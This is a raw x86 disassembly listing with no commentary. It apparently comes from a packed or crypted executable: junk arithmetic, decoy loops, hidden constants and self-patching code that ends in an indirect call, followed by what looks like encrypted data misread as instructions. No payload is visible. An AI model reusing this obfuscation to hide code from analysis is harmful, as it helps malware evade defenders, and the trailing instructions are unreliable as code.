  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff6e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3ec
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d470
  40b34b:	mov    esi,DWORD PTR ds:0x41d468
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d468,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d468
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d468
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d468
  40b3aa:	mov    ds:0x41d470,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffc1
  40b3fa:	push   0x41ffab
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3ec
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4f8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d20c
  40b4c0:	mov    esi,DWORD PTR ds:0x41d228
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42004f
  40b51b:	mov    esi,DWORD PTR ds:0x41d224
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420037
  40b559:	mov    ecx,DWORD PTR ds:0x41d1f0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d268
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4c4
  40b774:	push   DWORD PTR ds:0x41d270
  40b77a:	push   DWORD PTR ds:0x41d4a4
  40b780:	push   DWORD PTR ds:0x41d518
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d468
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d264
  40b812:	mov    edx,DWORD PTR ds:0x41d1f0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3ec
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d23c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0x21d153e4
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x2a]
  40bac3:	jge    0x40ba7d
  40bac5:	lahf   
  40bac6:	dec    ecx
  40bac7:	xchg   edi,eax
  40bac8:	sahf   
  40bac9:	lds    ecx,FWORD PTR [ebx+0x15]
  40bacc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bacd:	dec    eax
  40bace:	mov    DWORD PTR [ecx-0x13580018],eax
  40bad4:	dec    ecx
  40bad5:	ins    DWORD PTR es:[edi],dx
  40bad6:	pop    edx
  40bad7:	aad    0xea
  40bad9:	xchg   ebp,eax
  40bada:	mov    edx,0xb1f9de83
  40badf:	jle    0x40bb3e
  40bae1:	push   edx
  40bae2:	push   ss
  40bae3:	xchg   ecx,eax
  40bae4:	inc    ebp
  40bae5:	and    dh,bh
  40bae7:	sub    eax,0xc25b363
  40baec:	mov    eax,ds:0x3fbd0a9e
  40baf1:	popa   
  40baf2:	mov    ch,0x7e
  40baf4:	inc    edx
  40baf5:	or     ecx,esi
  40baf7:	ss retf 0x9d1c
  40bafb:	call   0x96ad6c03
  40bb00:	hlt    
  40bb01:	push   ss
  40bb02:	add    eax,0xf22dcf69
  40bb07:	inc    esi
  40bb08:	dec    esp
  40bb09:	sbb    bh,BYTE PTR [eax-0x470e21e]
  40bb0f:	adc    ebx,esp
  40bb11:	pop    edx
  40bb12:	push   0x82c72b4b
  40bb17:	ret    
  40bb18:	imul   ecx,DWORD PTR [ebx-0x586a9623],0x498a6bea
  40bb22:	sub    eax,0x1e08f059
  40bb27:	repz retf 0xcbbc
  40bb2b:	and    DWORD PTR [eax+0x3d],edi
  40bb2e:	std    
  40bb2f:	lods   eax,DWORD PTR ds:[esi]
  40bb30:	lods   al,BYTE PTR ds:[esi]
  40bb31:	mov    ch,0x28
  40bb33:	imul   ebp,DWORD PTR [eax-0x21],0x2248908e
  40bb3a:	adc    ebx,DWORD PTR [ecx-0x21174564]
  40bb40:	mov    dl,ah
  40bb42:	cmp    ebp,DWORD PTR [ebx-0x6f]
  40bb45:	imul   esp,DWORD PTR [esi-0x7cdfe5ba],0xffffff83
  40bb4c:	cld    
  40bb4d:	cmp    BYTE PTR [ecx],al
  40bb4f:	lock jg 0x40baf6
  40bb52:	sub    DWORD PTR [eax],esp
  40bb54:	lahf   
  40bb55:	xchg   ebx,eax
  40bb56:	mov    bh,0x42
  40bb58:	pop    ebp
  40bb59:	ds test eax,0x26fb088f
  40bb5f:	xchg   ebp,eax
  40bb60:	fs dec ecx
  40bb62:	fimul  WORD PTR fs:[edx+edx*8+0x450be83a]
  40bb6a:	mov    ebx,0x47ce4de7
  40bb6f:	retf   
  40bb70:	shl    DWORD PTR [edx*2+0x180f6354],cl
  40bb77:	jns    0x40bbce
  40bb79:	outs   dx,BYTE PTR ds:[esi]
  40bb7a:	shr    DWORD PTR [ebx-0x4e],1
  40bb7d:	inc    edi
  40bb7e:	mov    edx,0xd60c31fa
  40bb83:	fadd   st,st(2)
  40bb85:	adc    BYTE PTR [edx+ebx*1-0x4752cddb],bl
  40bb8c:	pop    edi
  40bb8d:	xchg   dl,dl
  40bb8f:	xchg   ebp,eax
  40bb90:	lahf   
  40bb91:	ins    BYTE PTR es:[edi],dx
  40bb92:	xchg   esi,eax
  40bb93:	inc    edi
  40bb94:	sbb    al,0x27
  40bb96:	icebp  
  40bb97:	pop    ebx
  40bb98:	cmp    ch,dl
  40bb9a:	cmp    BYTE PTR [ebp+0x18],dl
  40bb9d:	shr    BYTE PTR [ebx-0x63],cl
  40bba0:	mov    eax,ds:0x50ca9dae
  40bba5:	das    
  40bba6:	cli    
  40bba7:	inc    esp
  40bba8:	lahf   
  40bba9:	hlt    
  40bbaa:	std    
  40bbab:	(bad)  
  40bbac:	sub    al,0x86
  40bbae:	sub    cl,BYTE PTR [ebx-0x3f]
  40bbb1:	inc    esp
  40bbb2:	(bad)  
  40bbb3:	jecxz  0x40bba6
  40bbb5:	push   ebx
  40bbb6:	test   eax,0x657582a
  40bbbb:	je     0x40bc12
  40bbbd:	lea    ecx,[ecx]
  40bbbf:	jno    0x40bb74
  40bbc1:	fs ins BYTE PTR es:[edi],dx
  40bbc3:	outs   dx,BYTE PTR ds:[esi]
  40bbc4:	popa   
  40bbc5:	sbb    DWORD PTR ds:0x7e141757,0xffffff86
  40bbcc:	ja     0x40bbb6
  40bbce:	fstp   DWORD PTR [esi-0xd]
  40bbd1:	retf   0x7e19
  40bbd4:	div    DWORD PTR [ebx+0x2c9d741e]
  40bbda:	popa   
  40bbdb:	pop    es
  40bbdc:	dec    ebx
  40bbdd:	inc    ecx
  40bbde:	mov    ds:0x2f6d3aa3,al
  40bbe3:	pop    ebx
  40bbe4:	aam    0x2a
  40bbe6:	jg     0x40bc11
  40bbe8:	adc    DWORD PTR [edi-0x711205af],esi
  40bbee:	mov    ah,0x39
  40bbf0:	sub    DWORD PTR [edx+0x67bd2629],edi
  40bbf6:	repnz dec esp
  40bbf8:	sub    dl,BYTE PTR [ebp-0x5c80dc24]
  40bbfe:	push   ds
  40bbff:	inc    esi
  40bc00:	mov    ch,0xa8
  40bc02:	dec    ecx
  40bc03:	repz dec edx
  40bc05:	push   edx
  40bc06:	aas    
  40bc07:	sub    edx,ebp
  40bc09:	outs   dx,DWORD PTR ds:[esi]
  40bc0a:	push   edx
  40bc0b:	(bad)  
  40bc0c:	fnstcw WORD PTR [edx-0x1e138d35]
  40bc12:	cmp    ecx,0x5edbf4a4
  40bc18:	imul   esp,DWORD PTR [ebx+ebp*8],0xfce05092
  40bc1f:	psrad  mm3,QWORD PTR [eax-0x4a]
  40bc23:	pop    eax
  40bc24:	sti    
  40bc25:	mov    gs,WORD PTR [edi-0x32]
  40bc28:	out    dx,eax
  40bc29:	or     ah,BYTE PTR [ebx+ecx*8+0x4a]
  40bc2d:	stos   BYTE PTR es:[edi],al
  40bc2e:	mov    cl,0x12
  40bc30:	cs inc ecx
